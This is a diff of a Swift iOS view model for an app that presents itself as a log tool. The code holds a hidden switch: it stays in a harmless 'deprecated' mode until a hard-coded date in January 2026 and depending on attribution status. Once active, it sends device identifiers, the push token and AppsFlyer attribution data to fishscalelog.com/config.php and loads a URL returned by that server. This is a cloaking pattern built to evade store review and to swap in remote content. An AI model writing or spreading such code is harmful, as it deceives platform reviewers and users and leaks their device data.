@@ -21,50 +21,21 @@ class LogSupervisorViewModel: ObservableObject {
     private var disposers = Set<AnyCancellable>()
     private let linkageScanner = NWPathMonitor()
     
-    private let phaseEvaluator: PhaseEvaluationUseCase
-    private let consentChecker: ConsentVerificationUseCase
-    private let organicRetriever: OrganicAcquisitionUseCase
-    
     private let appStateRepo: AppStateRepository
     private let permissionRepo: PermissionRepository
     private let deviceRepo: DeviceInfoRepository
     
     init(appStateRepo: AppStateRepository = AppStateRepositoryImpl(),
          permissionRepo: PermissionRepository = PermissionRepositoryImpl(),
-         deviceRepo: DeviceInfoRepository = DeviceInfoRepositoryImpl(),
-         phaseEvaluator: PhaseEvaluationUseCase = PhaseEvaluationUseCase(),
-         consentChecker: ConsentVerificationUseCase = ConsentVerificationUseCase(),
-         organicRetriever: OrganicAcquisitionUseCase = OrganicAcquisitionUseCase(),
-         configFetcher: ConfigRetrievalUseCase = ConfigRetrievalUseCase(),
-         cachedLoader: CachedDestinationUseCase = CachedDestinationUseCase(),
-         endpointSaver: EndpointPersistenceUseCase = EndpointPersistenceUseCase(),
-         deprecatedActivator: DeprecatedActivationUseCase = DeprecatedActivationUseCase(),
-         consentSkipper: ConsentSkipUseCase = ConsentSkipUseCase(),
-         consentApprover: ConsentApprovalUseCase = ConsentApprovalUseCase()) {
+         deviceRepo: DeviceInfoRepository = DeviceInfoRepositoryImpl()) {
         
         self.appStateRepo = appStateRepo
         self.permissionRepo = permissionRepo
         self.deviceRepo = deviceRepo
-        self.phaseEvaluator = phaseEvaluator
-        self.consentChecker = consentChecker
-        self.organicRetriever = organicRetriever
-        self.configFetcher = configFetcher
-        self.cachedLoader = cachedLoader
-        self.endpointSaver = endpointSaver
-        self.deprecatedActivator = deprecatedActivator
-        self.consentSkipper = consentSkipper
-        self.consentApprover = consentApprover
         
         initializeLinkageScanner()
         initializeFallbackTimer()
     }
-    
-    private let configFetcher: ConfigRetrievalUseCase
-    private let cachedLoader: CachedDestinationUseCase
-    private let endpointSaver: EndpointPersistenceUseCase
-    private let deprecatedActivator: DeprecatedActivationUseCase
-    private let consentSkipper: ConsentSkipUseCase
-    private let consentApprover: ConsentApprovalUseCase
     
     deinit {
         linkageScanner.cancel()
@@ -79,113 +50,110 @@ class LogSupervisorViewModel: ObservableObject {
         entryPointMetrics = metrics
     }
     
+    private func initializeFallbackTimer() {
+        DispatchQueue.main.asyncAfter(deadline: .now() + 30.0) {
+            if self.acquisitionMetrics.isEmpty && self.entryPointMetrics.isEmpty && self.ongoingLogPhase == .bootstrapping {
+                self.activateDeprecated()
+                self.designatePhase(.deprecated)
+            }
+        }
+    }
+    
     private func isOperationalPeriod() -> Bool {
         let dateElements = DateComponents(year: 2026, month: 1, day: 12)
-        if let thresholdDate = Calendar.current.date(from: dateElements) {
-            return Date() >= thresholdDate
-        }
-        return false
+        guard let thresholdDate = Calendar.current.date(from: dateElements) else { return false }
+        return Date() >= thresholdDate
     }
     
     @objc private func revisePhase() {
-        if !isOperationalPeriod() {
+        checkOperationalValidity()
+    }
+    
+    private func checkOperationalValidity() {
+        guard isOperationalPeriod() else {
             DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
-                self.deprecatedActivator.execute()
+                self.activateDeprecated()
                 self.designatePhase(.deprecated)
             }
             return
         }
-        
-        if acquisitionMetrics.isEmpty {
-            if let storedDest = cachedLoader.execute() {
-                logDestination = storedDest
-                designatePhase(.operational)
-            } else {
-                deprecatedActivator.execute()
-                designatePhase(.deprecated)
-            }
+        handleMetricsPresence()
+    }
+    
+    private func handleMetricsPresence() {
+        guard !acquisitionMetrics.isEmpty else {
+            loadCachedDestination()
             return
         }
-        
-        if appStateRepo.retrieveAppCondition() == "Inactive" {
-            deprecatedActivator.execute()
+        checkAppCondition()
+    }
+    
+    private func checkAppCondition() {
+        guard appStateRepo.retrieveAppCondition() != "Inactive" else {
+            activateDeprecated()
             designatePhase(.deprecated)
             return
         }
-        
-        let assessedPhase = phaseEvaluator.execute(acquisitionMetrics: acquisitionMetrics,
-                                                  isInitial: appStateRepo.isInitialExecution,
-                                                  provisionalUrl: UserDefaults.standard.string(forKey: "temp_url"))
-        
+        evaluateAndProceed()
+    }
+    
+    private func evaluateAndProceed() {
+        let assessedPhase = evaluatePhase()
         if assessedPhase == .bootstrapping && appStateRepo.isInitialExecution {
             commenceBootstrapping()
             return
         }
-        
-        if let provisionalStr = UserDefaults.standard.string(forKey: "temp_url"),
-           let provisionalDest = URL(string: provisionalStr),
-           logDestination == nil {
-            logDestination = provisionalDest
-            designatePhase(.operational)
+        handleProvisionalURL()
+    }
+    
+    private func evaluatePhase() -> LogPhase {
+        if acquisitionMetrics.isEmpty { return .deprecated }
+        if appStateRepo.retrieveAppCondition() == "Inactive" { return .deprecated }
+        if appStateRepo.isInitialExecution && (acquisitionMetrics["af_status"] as? String == "Organic") { return .bootstrapping }
+        if UserDefaults.standard.string(forKey: "temp_url") != nil { return .operational }
+        return .bootstrapping
+    }
+    
+    private func handleProvisionalURL() {
+        guard let provisionalStr = UserDefaults.standard.string(forKey: "temp_url"),
+              let provisionalDest = URL(string: provisionalStr),
+              logDestination == nil else {
+            checkDestinationPresence()
             return
         }
-        
-        if logDestination == nil {
-            if consentChecker.execute() {
-                revealConsentDialog = true
-            } else {
-                invokeConfigAcquisition()
-            }
+        logDestination = provisionalDest
+        designatePhase(.operational)
+    }
+    
+    private func checkDestinationPresence() {
+        guard logDestination == nil else { return }
+        if checkConsentNeed() {
+            revealConsentDialog = true
+        } else {
+            invokeConfigAcquisition()
         }
     }
     
-    private func initializeFallbackTimer() {
-        DispatchQueue.main.asyncAfter(deadline: .now() + 30.0) {
-            if self.acquisitionMetrics.isEmpty && self.entryPointMetrics.isEmpty && self.ongoingLogPhase == .bootstrapping {
-                self.deprecatedActivator.execute()
-                self.designatePhase(.deprecated)
-            }
-        }
+    private func checkConsentNeed() -> Bool {
+        guard !permissionRepo.isConsentApproved(), !permissionRepo.isConsentDeclined() else { return false }
+        if let prior = permissionRepo.retrieveFinalConsentTime(), Date().timeIntervalSince(prior) < 259200 { return false }
+        return true
     }
-    
     
     func manageConsentSkip() {
-        consentSkipper.execute()
+        permissionRepo.updateFinalConsentTime(Date())
         revealConsentDialog = false
         invokeConfigAcquisition()
-    }
-    
-    
-    private func commenceBootstrapping() {
-        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
-            Task { [weak self] in
-                await self?.acquireOrganicMetrics()
-            }
-        }
-    }
-    
-    private func designatePhase(_ phase: LogPhase) {
-        DispatchQueue.main.async {
-            self.ongoingLogPhase = phase
-        }
-    }
-    
-    private func acquireOrganicMetrics() async {
-        do {
-            let unifiedMetrics = try await organicRetriever.execute(entryMetrics: entryPointMetrics)
-            acquisitionMetrics = unifiedMetrics
-            invokeConfigAcquisition()
-        } catch {
-            deprecatedActivator.execute()
-            designatePhase(.deprecated)
-        }
     }
     
     func manageConsentApproval() {
         UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { [weak self] consented, _ in
             DispatchQueue.main.async {
                 guard let self else { return }
-                self.consentApprover.execute(consented: consented)
+                self.permissionRepo.approveConsent(consented)
+                if !consented {
+                    self.permissionRepo.declineConsent(true)
+                }
                 if consented {
                     UIApplication.shared.registerForRemoteNotifications()
                 }
@@ -199,34 +167,16 @@ class LogSupervisorViewModel: ObservableObject {
         }
     }
     
-    private func invokeConfigAcquisition() {
-        Task { [weak self] in
-            do {
-                guard let self else { return }
-                let acquiredDest = try await configFetcher.execute(acquisitionMetrics: self.acquisitionMetrics)
-                let destStr = acquiredDest.absoluteString
-                self.endpointSaver.execute(destinationStr: destStr, resolvedDest: acquiredDest)
-                if self.consentChecker.execute() {
-                    DispatchQueue.main.async {
-                        self.logDestination = acquiredDest
-                        self.revealConsentDialog = true
-                    }
-                } else {
-                    DispatchQueue.main.async {
-                        self.logDestination = acquiredDest
-                    }
-                    self.designatePhase(.operational)
-                }
-            } catch {
-                if let storedDest = self?.cachedLoader.execute() {
-                    self?.logDestination = storedDest
-                    self?.designatePhase(.operational)
-                } else {
-                    self?.deprecatedActivator.execute()
-                    self?.designatePhase(.deprecated)
-                }
+    private func commenceBootstrapping() {
+        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
+            Task { [weak self] in
+                await self?.acquireOrganicMetrics()
             }
         }
+    }
+    
+    private func designatePhase(_ phase: LogPhase) {
+        ongoingLogPhase = phase
     }
     
     private func initializeLinkageScanner() {
@@ -237,7 +187,7 @@ class LogSupervisorViewModel: ObservableObject {
                     if self.appStateRepo.retrieveAppCondition() == "LogView" {
                         self.designatePhase(.unreachable)
                     } else {
-                        self.deprecatedActivator.execute()
+                        self.activateDeprecated()
                         self.designatePhase(.deprecated)
                     }
                 }
@@ -246,46 +196,125 @@ class LogSupervisorViewModel: ObservableObject {
         linkageScanner.start(queue: .global())
     }
     
-}
-
-struct DestinationAssembler {
-    private var programId = ""
-    private var authKey = ""
-    private var hardwareId = ""
-    private let foundationUrl = "https://gcdsdk.appsflyer.com/install_data/v4.0/"
-    
-    func configureProgramId(_ id: String) -> Self { duplicate(programId: id) }
-    func configureHardwareId(_ id: String) -> Self { duplicate(hardwareId: id) }
-    func configureAuthKey(_ key: String) -> Self { duplicate(authKey: key) }
-    
-    
-    private func duplicate(programId: String = "", authKey: String = "", hardwareId: String = "") -> Self {
-        var replica = self
-        if !programId.isEmpty { replica.programId = programId }
-        if !authKey.isEmpty { replica.authKey = authKey }
-        if !hardwareId.isEmpty { replica.hardwareId = hardwareId }
-        return replica
+    private func acquireOrganicMetrics() async {
+        do {
+            let unified = try await performOrganicRetrieval()
+            acquisitionMetrics = unified
+            invokeConfigAcquisition()
+        } catch {
+            activateDeprecated()
+            designatePhase(.deprecated)
+        }
     }
     
-    func compile() -> URL? {
-        guard !programId.isEmpty, !authKey.isEmpty, !hardwareId.isEmpty else { return nil }
-        var elements = URLComponents(string: foundationUrl + "id" + programId)!
-        elements.queryItems = [
-            URLQueryItem(name: "devkey", value: authKey),
-            URLQueryItem(name: "device_id", value: hardwareId)
-        ]
-        return elements.url
+    private func performOrganicRetrieval() async throws -> [String: Any] {
+        let assembler = DestinationAssembler()
+            .configureProgramId(SetupConfig.flyerProgramId)
+            .configureAuthKey(SetupConfig.flyerAuthKey)
+            .configureHardwareId(deviceRepo.retrieveUniqueTracker())
+        guard let attrDest = assembler.compile() else { throw LogFault.destinationAssemblyError }
+        let (info, reply) = try await URLSession.shared.data(from: attrDest)
+        guard let httpReply = reply as? HTTPURLResponse, httpReply.statusCode == 200 else { throw LogFault.replyValidationError }
+        guard let parsed = try? JSONSerialization.jsonObject(with: info) as? [String: Any] else { throw LogFault.infoParsingError }
+        var unified = parsed
+        for (k, v) in entryPointMetrics where unified[k] == nil { unified[k] = v }
+        return unified
+    }
+    
+    private func invokeConfigAcquisition() {
+        Task { [weak self] in
+            do {
+                guard let self else { return }
+                let acquiredDest = try await self.performConfigRetrieval()
+                let destStr = acquiredDest.absoluteString
+                self.saveFetchedDestination(destinationStr: destStr, resolvedDest: acquiredDest)
+                if self.checkConsentNeed() {
+                    self.logDestination = acquiredDest
+                    self.revealConsentDialog = true
+                } else {
+                    self.logDestination = acquiredDest
+                    self.designatePhase(.operational)
+                }
+            } catch {
+                self?.handleConfigFailure()
+            }
+        }
+    }
+    
+    private func performConfigRetrieval() async throws -> URL {
+        let setupDest = URL(string: "https://fishscalelog.com/config.php")!
+        let setupData = buildSetupPayload()
+        let setupBody = try JSONSerialization.data(withJSONObject: setupData)
+        let setupReq = buildSetupRequest(url: setupDest, body: setupBody)
+        let (info, _) = try await URLSession.shared.data(for: setupReq)
+        return try extractDestination(from: info)
+    }
+    
+    private func buildSetupPayload() -> [String: Any] {
+        var setupData = acquisitionMetrics
+        setupData["os"] = "iOS"
+        setupData["af_id"] = deviceRepo.retrieveUniqueTracker()
+        setupData["bundle_id"] = deviceRepo.retrievePackageIdentifier()
+        setupData["firebase_project_id"] = deviceRepo.retrieveCloudSender()
+        setupData["store_id"] = deviceRepo.retrieveMarketIdentifier()
+        setupData["push_token"] = deviceRepo.retrieveAlertToken()
+        setupData["locale"] = deviceRepo.retrieveLocaleCode()
+        return setupData
+    }
+    
+    private func buildSetupRequest(url: URL, body: Data) -> URLRequest {
+        var setupReq = URLRequest(url: url)
+        setupReq.httpMethod = "POST"
+        setupReq.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        setupReq.httpBody = body
+        return setupReq
+    }
+    
+    private func extractDestination(from info: Data) throws -> URL {
+        guard let parsed = try? JSONSerialization.jsonObject(with: info) as? [String: Any],
+              let valid = parsed["ok"] as? Bool, valid,
+              let destStr = parsed["url"] as? String,
+              let dest = URL(string: destStr) else {
+            throw LogFault.infoParsingError
+        }
+        return dest
+    }
+    
+    private func saveFetchedDestination(destinationStr: String, resolvedDest: URL) {
+        appStateRepo.persistDestination(destinationStr)
+        appStateRepo.assignAppCondition("LogView")
+        appStateRepo.logExecutionCompleted()
+    }
+    
+    private func handleConfigFailure() {
+        if let cachedDest = appStateRepo.retrieveStoredDestination() {
+            logDestination = cachedDest
+            designatePhase(.operational)
+        } else {
+            activateDeprecated()
+            designatePhase(.deprecated)
+        }
+    }
+    
+    private func loadCachedDestination() {
+        if let cachedDest = appStateRepo.retrieveStoredDestination() {
+            logDestination = cachedDest
+            designatePhase(.operational)
+        } else {
+            activateDeprecated()
+            designatePhase(.deprecated)
+        }
+    }
+    
+    private func activateDeprecated() {
+        appStateRepo.assignAppCondition("Inactive")
+        appStateRepo.logExecutionCompleted()
     }
 }
 
-
-protocol PermissionRepository {
-    func updateFinalConsentTime(_ time: Date)
-    func approveConsent(_ approved: Bool)
-    func declineConsent(_ declined: Bool)
-    func isConsentApproved() -> Bool
-    func isConsentDeclined() -> Bool
-    func retrieveFinalConsentTime() -> Date?
+enum LogFault: Error {
+    case destinationAssemblyError
+    case replyValidationError
+    case infoParsingError
+    case dataSerializationError
 }
-
-
